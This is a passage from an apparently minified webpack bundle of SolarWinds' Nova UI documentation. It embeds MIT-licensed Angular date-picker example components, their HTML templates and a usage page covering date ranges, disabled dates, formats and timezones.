(the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport { Moment } from "moment/moment";\n\n@Component({\n    selector: "nui-date-picker-calendar-navigated-example",\n    templateUrl: "./date-picker-calendar-navigated.example.component.html",\n})\nexport class DatePickerCalendarNavigatedExampleComponent {\n    public calendarChangedDate: Date;\n\n    public dateChanged(event: Moment): void {\n        this.calendarChangedDate = new Date(event.valueOf());\n    }\n}\n'},11570:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-date-picker [inline]="true" [onlyCurrentMonth]="true"> </nui-date-picker>\n'},64782:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-date-picker-current-month-example",\n    templateUrl: "./date-picker-current-month.example.component.html",\n})\nexport class DatePickerCurrentMonthExampleComponent {}\n'},33216:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-date-picker [minDate]="minDate" [maxDate]="maxDate"> </nui-date-picker>\n'},23008:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport moment, { Moment } from "moment/moment";\n\n@Component({\n    selector: "nui-date-picker-date-range-example",\n    templateUrl: "./date-picker-date-range.example.component.html",\n})\nexport class DatePickerDateRangeExampleComponent {\n    private currentDate = moment();\n\n    public minDate: Moment = this.currentDate.clone().date(5);\n    public maxDate: Moment = this.currentDate.clone().date(25);\n}\n'},68782:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-date-picker [disabledDates]="dateDisabled"> </nui-date-picker>\n'},69578:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport moment from "moment/moment";\n\nimport { IDatePickerDisabledDate } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-date-picker-disable-date-example",\n    templateUrl: "./date-picker-disable-date.example.component.html",\n})\nexport class DatePickerDisableDateExampleComponent {\n    private currentDate = moment();\n    private yesterdayDate = this.currentDate.clone().add(-1, "days");\n    private tomorrowDate = this.currentDate.clone().add(1, "days");\n    private lastMonthDate = this.currentDate.clone().add(-1, "months");\n    private nextYearDate = this.currentDate.clone().add(1, "years");\n\n    public dateDisabled: IDatePickerDisabledDate[] = [\n        {\n            date: this.currentDate,\n            mode: "day",\n        },\n        {\n            date: this.yesterdayDate,\n            mode: "day",\n        },\n        {\n            date: this.tomorrowDate,\n            mode: "day",\n        },\n        {\n            date: this.lastMonthDate,\n            mode: "month",\n        },\n        {\n            date: this.nextYearDate,\n            mode: "year",\n        },\n    ];\n}\n'},65056:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-date-picker [isDisabled]="true"> </nui-date-picker>\n'},91392:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-date-picker-disabled-example",\n    templateUrl: "./date-picker-disabled.example.component.html",\n})\nexport class DatePickerDisabledExampleComponent {}\n'},35370:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<p>\n    <code>&lt;nui-date-picker&gt;</code> allows user to select a specific date.\n    Date Picker consists of Date Input Field with Date Icon and Daily Calendar.\n    Clicking on the date input field opens the daily calendar. The date field\n    itself allows user to either type a specific date directly into the field or\n    select a date using the calendar in the popover. Note: The input for this\n    field is validated. Date picker supports various attributes for user\n    configuration using\n    <code\n        ><a href="../interfaces/IDatePickerConfig.html" target="_blank"\n            >IDatePickerConfig</a\n        ></code\n    >.\n</p>\n<nui-message type="info" [allowDismiss]="false"\n    >Note, BrowserAnimationModule is required to make DatePicker component\n    work.</nui-message\n>\n\n<h2>Required Modules</h2>\n<ul>\n    <li>\n        <code> NuiDatePickerModule </code>\n    </li>\n</ul>\n\n<h2>Basic Usage</h2>\n<p>\n    To implement a date picker you need to use the\n    <code>&lt;nui-date-picker&gt;</code> component.\n</p>\n<nui-example-wrapper\n    filenamePrefix="date-picker-basic"\n    exampleTitle="Basic Usage"\n>\n    <nui-date-picker-basic-example></nui-date-picker-basic-example>\n</nui-example-wrapper>\n\n<h2>Value Change Event</h2>\n<p>\n    You can pass the <code>(valueChange)</code> input to the date picker and\n    perform an action when the selected date changes.\n    <code>(valueChange)</code> output emits <code>Moment</code> object.\n</p>\n<nui-example-wrapper\n    filenamePrefix="date-picker-value-change"\n    exampleTitle="Value Change Event"\n>\n    <nui-date-picker-value-change-example></nui-date-picker-value-change-example>\n</nui-example-wrapper>\n\n<h2>Calendar Navigated Event</h2>\n<p>\n    Every time one navigates the calendar back and forth using navigation\n    arrows, the <code>(calendarNavigated)</code> output is triggered to notify\n    user with navigated date (first day of the month in a Moment format).\n</p>\n<nui-example-wrapper\n    filenamePrefix="date-picker-calendar-navigated"\n    exampleTitle="Calendar Navigated Event"\n>\n    <nui-date-picker-calendar-navigated-example></nui-date-picker-calendar-navigated-example>\n</nui-example-wrapper>\n\n<h2>Disabled</h2>\n<p>\n    <code>[isDisabled]="true"</code> input is used to disable the date picker\n    input field.\n</p>\n<nui-example-wrapper\n    filenamePrefix="date-picker-disabled"\n    exampleTitle="Disabled"\n>\n    <nui-date-picker-disabled-example></nui-date-picker-disabled-example>\n</nui-example-wrapper>\n\n<h2>With Error</h2>\n<p>\n    <code>[isInErrorState]="true"</code> input is used to apply error state\n    styles to the date picker.\n</p>\n<nui-example-wrapper\n    filenamePrefix="date-picker-with-error"\n    exampleTitle="With Error"\n>\n    <nui-date-picker-with-error-example></nui-date-picker-with-error-example>\n</nui-example-wrapper>\n\n<h2>Inline</h2>\n<p>\n    To make date picker inline you can use <code>[inline]="true"</code> input.\n</p>\n<nui-example-wrapper filenamePrefix="date-picker-inline" exampleTitle="Inline">\n    <nui-date-picker-inline-example></nui-date-picker-inline-example>\n</nui-example-wrapper>\n\n<h2>Current Month</h2>\n<p>\n    You can pass <code>[onlyCurrentMonth]="true"</code> input to show only the\n    dates for the selected month in the day picker.\n</p>\n<nui-example-wrapper\n    filenamePrefix="date-picker-current-month"\n    exampleTitle="Current Month"\n>\n    <nui-date-picker-current-month-example></nui-date-picker-current-month-example>\n</nui-example-wrapper>\n\n<h2>Show Weeks</h2>\n<p>\n    You can pass <code>[showWeeks]="true"</code> input to show weeks numbers\n    from the start of the year.\n</p>\n<nui-example-wrapper\n    filenamePrefix="date-picker-show-weeks"\n    exampleTitle="Show Weeks"\n>\n    <nui-date-picker-show-weeks-example></nui-date-picker-show-weeks-example>\n</nui-example-wrapper>\n\n<h2>First Day of the Week</h2>\n<p>\n    To set which day to use as the first day of the week use the\n    <code>startingDay</code> attribute. <code>startingDay</code> must be\n    specified as a <code>Number</code> in the range <b>0</b> to <b>6</b>, where\n    <b>0</b> is <b>Sunday</b> and <b>6</b> is <b>Saturday</b>.\n</p>\n<nui-example-wrapper\n    filenamePrefix="date-picker-first-date-of-week"\n    exampleTitle="First Day of the Week"\n>\n    <nui-date-picker-first-date-of-week-example></nui-date-picker-first-date-of-week-example>\n</nui-example-wrapper>\n\n<h2>Initial Date</h2>\n<p>\n    To set an initial preselected date use the <code>value</code> input of type\n    <code>Moment</code>.\n</p>\n<nui-example-wrapper\n    filenamePrefix="date-picker-init-date"\n    exampleTitle="Initial Date"\n>\n    <nui-date-picker-init-date-example></nui-date-picker-init-date-example>\n</nui-example-wrapper>\n\n<h2>Date Picker in a Reactive Form</h2>\n<p>\n    <code>&lt;nui-date-picker&gt;</code> may be used in a reactive form by\n    setting the <code>formControl</code> input.\n</p>\n<nui-example-wrapper\n    filenamePrefix="date-picker-reactive-form"\n    exampleTitle="Date Picker in a Reactive Form"\n>\n    <nui-date-picker-reactive-forms-example></nui-date-picker-reactive-forms-example>\n</nui-example-wrapper>\n\n<h2>Dates Range</h2>\n<p>\n    Attributes <code>minDate</code> and <code>maxDate</code> are used to set a\n    selectable range of dates, making other dates disabled.\n    <code>minDate</code> and <code>maxDate</code> must be specified as type\n    <code>Moment</code>.\n</p>\n<nui-example-wrapper\n    filenamePrefix="date-picker-date-range"\n    exampleTitle="Dates Range"\n>\n    <nui-date-picker-date-range-example></nui-date-picker-date-range-example>\n</nui-example-wrapper>\n\n<h2>Modes</h2>\n<p>\n    To change initial date picker view mode use\n    <code>datepickerMode</code> attribute of type <code>String</code>. Supported\n    values are <b>"day"</b> (default), <b>"month"</b> and <b>"year"</b>.\n</p>\n<nui-example-wrapper\n    filenamePrefix="date-picker-init-mode"\n    exampleTitle="Modes"\n>\n    <nui-date-picker-init-mode-example></nui-date-picker-init-mode-example>\n</nui-example-wrapper>\n\n<h2>Modes Range</h2>\n<p>\n    To set constraints on the date picker view modes use the\n    <code>minMode</code> and <code>maxMode</code> attributes of type\n    <code>String</code> in combination with <code>datepickerMode</code>.\n    Supported values are <b>"day"</b>, <b>"month"</b> and <b>"year"</b>.\n</p>\n<nui-example-wrapper\n    filenamePrefix="date-picker-modes-range"\n    exampleTitle="Modes Range"\n>\n    <nui-date-picker-modes-range-example></nui-date-picker-modes-range-example>\n</nui-example-wrapper>\n\n<h2>Years Range</h2>\n<p>\n    The attribute <code>yearRange</code> is used to set the selectable range of\n    years starting from the current year, making other years disabled.\n    <code>yearRange</code> must be specified as a positive <code>Number</code>.\n</p>\n<nui-example-wrapper\n    filenamePrefix="date-picker-year-range"\n    exampleTitle="Years Range"\n>\n    <nui-date-picker-year-range-example></nui-date-picker-year-range-example>\n</nui-example-wrapper>\n\n<h2>Disabled Dates</h2>\n<p>\n    Attribute <code>dateDisabled</code> of type\n    <code\n        ><a href="../interfaces/IDatePickerDisabledDates.html" target="_blank"\n            >IDatePickerDisabledDates</a\n        ></code\n    >\n    allows the user to specify an array of dates to be disabled for selection.\n    The <code>date</code> field of each array element specifies the date to be\n    disabled, and the <code>mode</code> field allows the user to specify the\n    mode: <b>"day"</b> (default), <b>"month"</b> or <b>"year"</b>. For example,\n    if <code>mode</code> is set to <b>"day"</b>, only the specified date will be\n    disabled. If <code>mode</code> is set to <b>"month"</b>, the whole month of\n    the specified date will be disabled. If <code>mode</code> is set to\n    <b>"year"</b>, the whole year of the specified date will be disabled. If\n    current date is disabled - "Today" button of day picker will also be\n    disabled.\n</p>\n<nui-example-wrapper\n    filenamePrefix="date-picker-disable-date"\n    exampleTitle="Disabled Dates"\n>\n    <nui-date-picker-disable-date-example></nui-date-picker-disable-date-example>\n</nui-example-wrapper>\n\n<h2>Formatting</h2>\n<div>\n    You can use custom formats to change the visualization of dates, days,\n    months, years, and headings in the date picker. See\n    <code\n        ><a\n            href="https://momentjs.com/docs/#/displaying/format/"\n            target="_blank"\n            >Moment.js date formats</a\n        ></code\n    >\n    for more information about the construction of date formats. Use the\n    following attributes of type <code>String</code>\n    to apply custom formats:\n    <ul>\n        <li>\n            <code>dateFormat</code> - textbox date format. The selected date or\n            typed-in date, if valid, will be modified inline and displayed using\n            this format. If the value of dateFormat is an invalid format, or if\n            it isn\'t specified, it will be set to a default value of\n            <code>"DD MMM YYYY"</code>.\n        </li>\n        <li><code>formatDay</code> - format of the days in the day picker</li>\n        <li>\n            <code>formatMonth</code> - format of the months in the month picker\n        </li>\n        <li>\n            <code>formatYear</code> - format of the years in the year picker and\n            of the year picker title\n        </li>\n        <li>\n            <code>formatDayHeader</code> - format of the day of the week in the\n            week header\n        </li>\n        <li><code>formatDayTitle</code> - format of the day picker title</li>\n        <li>\n            <code>formatMonthTitle</code> - format of the month picker title\n        </li>\n    </ul>\n    Supported formats:\n    <ul>\n        <li>"D MMM YY": 3 Aug 18</li>\n        <li>"D MMM YYYY": 3 Aug 2018</li>\n        <li>"DD MMM YY": 03 Aug 18</li>\n        <li>"DD MMM YYYY": 03 Aug 2018</li>\n        <li>"Do MMM YY": 3rd Aug 18</li>\n        <li>"Do MMM YYYY": 3rd Aug 2018</li>\n        <li>"MMM D, YY": Aug 3, 18</li>\n        <li>"MMM D, YYYY": Aug 3, 2018</li>\n        <li>"MMM DD, YY": Aug 03, 18</li>\n        <li>"MMM DD, YYYY": Aug 03, 2018</li>\n        <li>"MMM Do, YY": Aug 3rd, 18</li>\n        <li>"MMM Do, YYYY": Aug 3rd, 2018</li>\n        <li>"M/D/YY": 8/3/18</li>\n        <li>"M/D/YYYY": 8/3/2018</li>\n        <li>"MM/DD/YY": 08/03/18</li>\n        <li>"MM/DD/YYYY": 08/03/2018</li>\n        <li>"M-D-YY": 8-3-18</li>\n        <li>"M-D-YYYY": 8-3-2018</li>\n        <li>"MM-DD-YY": 08-03-18</li>\n        <li>"MM-DD-YYYY": 08-03-2018</li>\n        <li>"M D YY": 8 3 18</li>\n        <li>"M D YYYY": 8 3 2018</li>\n        <li>"MM DD YY": 08 03 18</li>\n        <li>"MM DD YYYY": 08 03 2018</li>\n        <li>"M.D.YY": 8.3.18</li>\n        <li>"M.D.YYYY": 8.3.2018</li>\n        <li>"MM.DD.YY": 08.03.18</li>\n        <li>"MM.DD.YYYY": 08.03.2018</li>\n    </ul>\n</div>\n<nui-example-wrapper\n    filenamePrefix="date-picker-formatting"\n    exampleTitle="Formatting"\n>\n    <nui-date-picker-formatting-example></nui-date-picker-formatting-example>\n</nui-example-wrapper>\n\n<h2>Preserve Insignificant</h2>\n<p>\n    <code>[preserveInsignificant]="true"</code> input tells date picker whether\n    to preserve the hours, minutes, seconds, and milliseconds of the date.\n</p>\n<nui-example-wrapper\n    filenamePrefix="date-picker-insignificant"\n    exampleTitle="Preserve Insignificant"\n>\n    <nui-date-picker-insignificant-example></nui-date-picker-insignificant-example>\n</nui-example-wrapper>\n\n<h2>Date Picker using in different timezones</h2>\n<p>\n    It\'s possible to use <code>DatePickerComponent</code> in different\n    timezones. To preserve timezone value set <code>handleTimezone</code> flag\n    on the component to <code>true</code>\n</p>\n<nui-example-wrapper\n    filenamePrefix="date-picker-timezone"\n    exampleTitle="Basic Usage"\n>\n    <nui-date-picker-timezone-example></nui-date-picker-timezone-example>\n</nui-example-wrapper>\n'},88406:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-date-picker-docs-example",\n    templateUrl: "./date-picker-docs.example.component.html",\n})\nexport class DatePickerDocsComponent {}\n'},56764:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-date-picker [inline]="true" [startingDay]="5"> </nui-date-picker>\n'},92780:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-date-picker-first-date-of-week-example",\n    templateUrl: "./date-picker-first-date-of-week.example.component.html",\n})\nexport class DatePickerFirstDateOfWeekExampleComponent {}\n'},42658:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-date-picker\n    [value]="initDate"\n    dateFormat="MM/DD/YY"\n    formatDay="Do"\n    formatMonth="MMM"\n    formatYear="YY"\n    formatDayHeader="ddd"\n    formatDayTitle="MMM YY"\n    formatMonthTitle="YY"\n>\n</nui-date-picker>\n'},90558:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport moment, { Moment } from "moment/moment";\n\n@Component({\n    selector: "nui-date-picker-formatting-example",\n    templateUrl: "./date-picker-formatting.example.component.html",\n})\nexport class DatePickerFormattingExampleComponent {\n    public initDate: Moment = moment();\n}\n'},33606:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-date-picker [value]="initDate"></nui-date-picker>\n'},7250:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport moment, { Moment } from "moment/moment";\n\n@Component({\n    selector: "nui-date-picker-init-date-example",\n    templateUrl: "./date-picker-init-date.example.component.html",\n})\nexport class DatePickerInitDateExampleComponent {\n    public initDate: Moment = moment("2018-08-04");\n}\n'},94418:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-date-picker [inline]="true" datepickerMode="month"> </nui-date-picker>\n'},5038:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-date-picker-init-mode-example",\n    templateUrl: "./date-picker-init-mode.example.component.html",\n})\nexport class DatePickerInitModeExampleComponent {}\n'},94094:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-date-picker [inline]="true"> </nui-date-picker>\n'},61930:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-date-picker-inline-example",\n    templateUrl: "./date-picker-inline.example.component.html",\n})\nexport class DatePickerInlineExampleComponent {}\n'},70082:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-date-picker\n    [formControl]="control"\n    [inline]="true"\n    [preserveInsignificant]="true"\n    (valueChange)="dateChanged($event)"\n>\n</nui-date-picker>\n\n<div>\n    <p class="mt-2">Value: {{ selectedDate }}</p>\n    <p class="mt-2">Control Value: {{ control.value.toISOString() }}</p>\n</div>\n'},58302:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  